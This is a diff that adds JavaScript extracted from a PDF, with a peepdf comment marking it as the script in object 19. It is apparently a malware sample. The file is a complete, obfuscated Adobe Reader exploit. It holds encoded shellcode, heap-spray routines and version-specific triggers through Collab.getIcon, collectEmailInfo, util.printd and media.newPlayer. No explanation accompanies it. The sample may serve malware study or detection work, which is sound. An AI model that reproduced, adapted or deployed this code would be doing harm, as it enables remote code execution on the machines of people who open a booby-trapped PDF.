@@ -1,0 +1,120 @@
+// peepdf comment: Javascript code located in object 19 (version 1)
+
+var pGvRIJZpqdN;
+var i = 0;
+while (i < 18000) {
+    i++;
+    pGvRIJZpqdN = pGvRIJZpqdN + 0x60;
+}
+
+function repunes(a, p) {
+    unes = p;
+}
+var unes;
+repunes(unes, unescape);
+
+var ut = util;
+var col = Collab;
+var len = "length";
+var np = "newPlayer";
+
+function a(__) {
+    var _ = '';
+    for (var ___ = 0; ___ < __[len]; ___ += 4)
+    _ += '%u' + __.substr(___, 4);
+    return _;
+}
+
+function callsub() {
+    var f = arguments[0][arguments[1]];
+    var p = [];
+    for (var i = 2, j = 0; i < arguments.length; i++, j++) {
+        p[j] = arguments[i];
+    }
+    return f.apply(arguments[0], p);
+}
+
+function rep(count, what) {
+    var v = "";
+    while (--count >= 0) v += what;
+    return v;
+}
+
+function myunes(buf) {
+    var ret = '';
+    for (var x = 0; x < buf["length"]; x += 2) {
+        ret += callsub(ut, "byteToChar", Number('0x' + callsub(buf, "substr", x, 2)));
+    }
+    return ret;
+}
+pGvRIJZpqdN = unes(a("43414b4911EB5BFC334B66C9b0B980010B34E2f9" + "EBFAE805FFEBFFFFF911F9F9A3F972AC78159D15F9FD72F9" + "110DF869F9F901721611F9F970F906FF" + "91CF62542684ED11F9F870F9F5BFCF06" + "D0913FEB11AFF8FCF9F9BF7006E991CF" + "C5A082FE0F11F9F970F9EDBFCF068791" + "1B21118AF91EF9F9BF70CACD123072FA" + "C5B7387AA8FDF99306A8F5AF7AA00601" + "098DB9C4F9E68FF97010C5B7F993F993" + "F993FB93F9938F0606C5E9AFBF707ABD" + "F901328DF993F993F993FD938F0606BD" + "EDAFBF707AB1F9014C8DC178A9DCBFBD" + "B7728CC57854F941F9EBA9F9A99D8CBD" + "7858FD41F9EB16F913078C57406CFFF9" + "F9F91578F1F9F9F9AEAF09723F78EBE9" + "F9F93D72397A72F10A01405DFFF9F9F9" + "B0B0B0B0CD7817F107077C168C30A608" + "06A7C58F8F0606B1BD8F1906AFAC589D" + "F9C9F9F9397CEA8172C7F5B972C7E589" + "72C7F1A7C754917212F1C7F4B972C7CD" + "5172F941F9F922CA3C72A4A7FD3BAAF9" + "AFACCFAE9572E1DD72CFC5BC72CFFCAD" + "FA81C72CB372C7E1A372FAD91A24B0C5" + "72C772CD0CFA06CACA0555393DC3FE8D" + "3638FAF41201CF0B85C2EDDD268C3B72" + "397AC7DDE17224FAC79FF572C7B2A372" + "FAE5C724FD72FA72123CCAFB7239A62C" + "A4A73BA2F9F1F911F9F9A1F9397A3AFC"));
+
+function exp() {
+    var sc1 = "";
+    blah = rep(128, unes("%u4242%u4242%u4242%u4242%u4242")) + sc1 + pGvRIJZpqdN;
+    bbk = unes("%u4242%u4242");
+    wap = 20 + blah["length"]
+    while (bbk["length"] < wap)
+    bbk += bbk;
+    fillbk = callsub(bbk, "substring", 0, wap);
+    bk = callsub(bbk, "substring", 0, bbk["length"] - wap);
+    while (bk["length"] + wap < 0x40000) bk = bk + bk + fillbk;
+    mm = new Array();
+    for (i = 0; i < 200; i++)
+    mm[i] = bk + blah;
+    of = rep(4096, myunes("0a0a0a0a"));
+    var a = ["_N.bundle"]; //next time
+    callsub(col, "getIcon", of + a[0]);
+}
+
+function start() {
+    if (app.viewerVersion >= 7.0) {
+        plin = rep(1124, unes("%u0b0b%u0028%u06eb%u06eb")) + unes("%u0b0b%u0028%u0aeb%u0aeb") + unes("%u4346%u4a4b") + rep(122, unes("%u0b0b%u0028%u06eb%u06eb")) + pGvRIJZpqdN + rep(1256, unes("%u4a4b%u4748"));
+    } else {
+        blah = rep(128, unes("%u4242%u4242%u4242%u4242%u4242")) + pGvRIJZpqdN;
+        bbk = unes("%u4242%u4242");
+        wap = 20 + blah["length"]
+        while (bbk["length"] < wap) bbk += bbk;
+        fillbk = callsub(bbk, "substring", 0, wap);
+        bk = callsub(bbk, "substring", 0, bbk["length"] - wap);
+        while (bk["length"] + wap < 0x40000) bk = bk + bk + fillbk;
+        mm = new Array();
+        for (i = 0; i < 250; i++) mm[i] = bk + blah;
+        plin = rep(8000, unes("%u0a0a%u0a0a"));
+    }
+
+    if (!(app.viewerVersion < 6.0)) //gakghfvlgfal
+    {
+        callsub(col, "collectEmailInfo", {
+            subj: 0,
+            msg: plin
+        });
+    }
+}
+
+if (app.viewerVersion > 9.0) {
+    var AKjtQExdzrASxZtHTFMSwNZfztONMZPULUqwGGdUSJSLxByMJtOdErPceyqDZbc = unes("%u0c0c%u0c0c");
+    var Qsd = unes("%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u5a51%u4874%u5961%u6b71%u4772%u6a47%u4a73%u6247%u654b%u734b%u4858%u6371%u717a%u7672%u626e%u626e%u455a%u4243%u6764%u7646%u696b%u6a6e%u4e61%u6c6d%u7350%u5168%u7171%u5574");
+    while (AKjtQExdzrASxZtHTFMSwNZfztONMZPULUqwGGdUSJSLxByMJtOdErPceyqDZbc.length <= 32768)
+    AKjtQExdzrASxZtHTFMSwNZfztONMZPULUqwGGdUSJSLxByMJtOdErPceyqDZbc += AKjtQExdzrASxZtHTFMSwNZfztONMZPULUqwGGdUSJSLxByMJtOdErPceyqDZbc;
+    AKjtQExdzrASxZtHTFMSwNZfztONMZPULUqwGGdUSJSLxByMJtOdErPceyqDZbc = callsub(AKjtQExdzrASxZtHTFMSwNZfztONMZPULUqwGGdUSJSLxByMJtOdErPceyqDZbc, "substring", 0, 32768 - pGvRIJZpqdN.length);
+    aa = new Array();
+
+    for (i = 0; i < 0x2000; i++) {
+        aa[i] = AKjtQExdzrASxZtHTFMSwNZfztONMZPULUqwGGdUSJSLxByMJtOdErPceyqDZbc + pGvRIJZpqdN;
+    }
+
+    callsub(ut, "printd", "FGgITeSFZAjpOsSyXgoMbUZttCRxNEDbuZjH", new Date());
+    callsub(ut, "printd", "PAAhBAPMqrBpJVqRwqwcuxjWkEUEcZdEnvdP", new Date());
+    try {
+        callsub(this.media, np, null)
+    } catch (e) {
+
+    }
+    callsub(ut, "printd", Qsd, new Date())
+} else if (app.viewerVersion >= 8.0) {
+    exp();
+} else {
+    var shaft = app.setTimeOut("start()", 1200);
+}
+
